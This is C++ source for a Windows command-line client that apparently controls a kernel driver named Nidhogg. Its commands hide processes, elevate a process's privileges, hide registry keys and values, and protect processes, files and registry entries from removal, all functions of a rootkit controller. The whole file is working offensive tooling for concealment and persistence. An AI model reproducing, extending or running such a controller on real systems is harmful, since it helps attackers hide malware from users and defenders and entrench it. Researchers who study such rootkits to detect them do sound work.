#include <Windows.h>
#include <iostream>
#include <vector>
#include "../NidhoggClient/Nidhogg.hpp"

enum class Options {
	Unknown,
	Add, Remove, Clear, Hide, Unhide, Elevate, Query
};

int Error(int errorCode) {
	switch (errorCode) {
	case NIDHOGG_GENERAL_ERROR:
		std::cout << "[ - ] General error: " << GetLastError() << std::endl;
		break;
	case NIDHOGG_ERROR_CONNECT_DRIVER:
		std::cout << "[ - ] Could not connect to driver: " << GetLastError() << std::endl;
		break;
	case NIDHOGG_ERROR_DEVICECONTROL_DRIVER:
		std::cout << "[ - ] Failed to do operation: " << GetLastError() << std::endl;
		break;
	default:
		std::cout << "[ - ] Unknown error: " << GetLastError() << std::endl;
		break;
	}

	return 1;
}

int PrintUsage() {
	std::cout << "[ * ] Possible usage:" << std::endl;
	std::cout << "\tNidhoggClient.exe process [add | remove | clear | hide | elevate | query] [pid | pid1 pid2...]" << std::endl;
	std::cout << "\tNidhoggClient.exe file [add | remove | clear | query] [path]" << std::endl;
	std::cout << "\tNidhoggClient.exe reg [add | remove | clear | hide | unhide | query] [key] [value]" << std::endl;
	return 0;
}

int wmain(int argc, const wchar_t* argv[]) {
	std::vector<DWORD> pids;
	Options option;
	int success = NIDHOGG_SUCCESS;

	if (argc < 3)
		return PrintUsage();

	if (_wcsicmp(argv[2], L"add") == 0)
		option = Options::Add;
	else if (_wcsicmp(argv[2], L"remove") == 0)
		option = Options::Remove;
	else if (_wcsicmp(argv[2], L"clear") == 0)
		option = Options::Clear;
	else if (_wcsicmp(argv[2], L"hide") == 0)
		option = Options::Hide;
	else if (_wcsicmp(argv[2], L"unhide") == 0)
		option = Options::Unhide;
	else if (_wcsicmp(argv[2], L"elevate") == 0)
		option = Options::Elevate;
	else if (_wcsicmp(argv[2], L"query") == 0)
		option = Options::Query;
	else {
		std::cout << "[ - ] Unknown option." << std::endl;
		return PrintUsage();
	}

	switch (option) {
	case Options::Add:
	{
		if (_wcsicmp(argv[1], L"process") == 0) {
			success = NidhoggProcessProtect(_wtoi(argv[3]));
		}
		else if (_wcsicmp(argv[1], L"file") == 0) {
			success = NidhoggFileProtect(_wcsdup(argv[3]));
		}
		else if (_wcsicmp(argv[1], L"reg") == 0) {
			if (argc == 5) {
				success = NidhoggRegistryProtectValue(_wcsdup(argv[3]), _wcsdup(argv[4]));
			}
			else {
				success = NidhoggRegistryProtectKey(_wcsdup(argv[3]));
			}
		}
		break;
	}
	case Options::Remove:
	{
		if (_wcsicmp(argv[1], L"process") == 0) {
			success = NidhoggProcessUnprotect(_wtoi(argv[3]));
		}
		else if (_wcsicmp(argv[1], L"file") == 0) {
			success = NidhoggFileUnprotect(_wcsdup(argv[3]));
		}
		else if (_wcsicmp(argv[1], L"reg") == 0) {
			if (argc == 5) {
				success = NidhoggRegistryUnprotectValue(_wcsdup(argv[3]), _wcsdup(argv[4]));
			}
			else {
				success = NidhoggRegistryUnprotectKey(_wcsdup(argv[3]));
			}
		}
		break;
	}
	case Options::Clear:
	{
		if (_wcsicmp(argv[1], L"process") == 0)
			success = NidhoggProcessClearAllProtection();
		else if (_wcsicmp(argv[1], L"file") == 0) {
			success = NidhoggFileClearAllProtection();
		}
		else if (_wcsicmp(argv[1], L"reg") == 0) {
			success = NidhoggRegistryClearAll();
		}
		break;
	}
	case Options::Hide:
	{
		if (_wcsicmp(argv[1], L"process") == 0) {
			success = NidhoggProcessHide(_wtoi(argv[3]));
		}
		else if (_wcsicmp(argv[1], L"file") == 0) {
			std::cerr << "[ - ] Invalid option!" << std::endl;
			PrintUsage();
			return 1;
		}
		else if (_wcsicmp(argv[1], L"reg") == 0) {
			if (argc == 5) {
				success = NidhoggRegistryHideValue(_wcsdup(argv[3]), _wcsdup(argv[4]));
			}
			else {
				success = NidhoggRegistryHideKey(_wcsdup(argv[3]));
			}
		}
		break;
	}
	case Options::Unhide:
	{
		if (_wcsicmp(argv[1], L"process") == 0) {
			std::cerr << "[ ! ] TBA" << std::endl;
			PrintUsage();
			return 1;
		}
		else if (_wcsicmp(argv[1], L"file") == 0) {
			std::cerr << "[ - ] Invalid option!" << std::endl;
			PrintUsage();
			return 1;
		}
		else if (_wcsicmp(argv[1], L"reg") == 0) {
			if (argc == 5) {
				success = NidhoggRegistryUnhideValue(_wcsdup(argv[3]), _wcsdup(argv[4]));
			}
			else {
				success = NidhoggRegistryUnhideKey(_wcsdup(argv[3]));
			}
		}
		break;
	}
	case Options::Elevate:
	{
		if (_wcsicmp(argv[1], L"process") == 0) {
			success = NidhoggProcessElevate(_wtoi(argv[3]));
		}
		else if (_wcsicmp(argv[1], L"file") == 0) {
			std::cerr << "[ - ] Invalid option!" << std::endl;
			PrintUsage();
			return 1;
		}
		else if (_wcsicmp(argv[1], L"reg") == 0) {
			std::cerr << "[ - ] Invalid option!" << std::endl;
			PrintUsage();
			return 1;
		}
		break;
	}

	case Options::Query:
	{
		if (_wcsicmp(argv[1], L"process") == 0) {
			std::vector result = NidhoggQueryProcesses();

			if (result[0] < 4) {
				success = result[0];
				break;
			}

			std::cout << "[ + ] Protected pids:" << std::endl;

			for (int i = 0; i < result.size(); i++) {
				std::cout << "\t" << result[i] << std::endl;
			}
		}
		else if (_wcsicmp(argv[1], L"file") == 0) {
			std::vector result = NidhoggQueryFiles();

			if (std::isdigit(result[0][0])) {
				success = std::stoi(result[0]);
				break;
			}

			std::cout << "[ + ] Protected files:" << std::endl;

			for (int i = 0; i < result.size(); i++) {
				std::wcout << "\t" << result[i] << std::endl;
			}
		}
		else if (_wcsicmp(argv[1], L"reg") == 0) {
			if (argc != 4) {
				PrintUsage();
				return 1;
			}

			if (_wcsicmp(argv[3], L"value") == 0) {
				auto [protectedValues, protectedKeys] = NidhoggRegistryQueryProtectedValues();

				if (std::isdigit(protectedValues[0][0])) {
					success = std::stoi(protectedValues[0]);
					break;
				}

				std::cout << "[ + ] Protected registry values:" << std::endl;

				for (int i = 0; i < protectedValues.size(); i++) {
					std::wcout << "\tKeyName: " << protectedKeys[i] << std::endl;
					std::wcout << "\tValueName: " << protectedValues[i] << std::endl;
				}

				auto [hiddenValues, hiddenKeys] = NidhoggRegistryQueryHiddenValues();

				if (std::isdigit(hiddenValues[0][0])) {
					success = std::stoi(hiddenValues[0]);
					break;
				}

				std::cout << "[ + ] Hidden registry values:" << std::endl;

				for (int i = 0; i < hiddenValues.size(); i++) {
					std::wcout << "\tKeyName: " << hiddenKeys[i] << std::endl;
					std::wcout << "\tValueName: " << hiddenValues[i] << std::endl;
				}

			}
			else if (_wcsicmp(argv[3], L"key") == 0) {
				std::vector result = NidhoggRegistryQueryProtectedKeys();

				if (std::isdigit(result[0][0])) {
					success = std::stoi(result[0]);
					break;
				}

				std::cout << "[ + ] Protected registry keys:" << std::endl;

				for (int i = 0; i < result.size(); i++) {
					std::wcout << "\t" << result[i] << std::endl;
				}

				result = NidhoggRegistryQueryHiddenKeys();

				if (std::isdigit(result[0][0])) {
					success = std::stoi(result[0]);
					break;
				}

				std::cout << "[ + ] Hidden registry keys:" << std::endl;

				for (int i = 0; i < result.size(); i++) {
					std::wcout << "\t" << result[i] << std::endl;
				}
			}
			else {
				PrintUsage();
				return 1;
			}
		}
		break;
	}
	}

	if (success != NIDHOGG_SUCCESS)
		return Error(success);

	std::cout << "[+] Operation succeeded." << std::endl;

	return success;
}
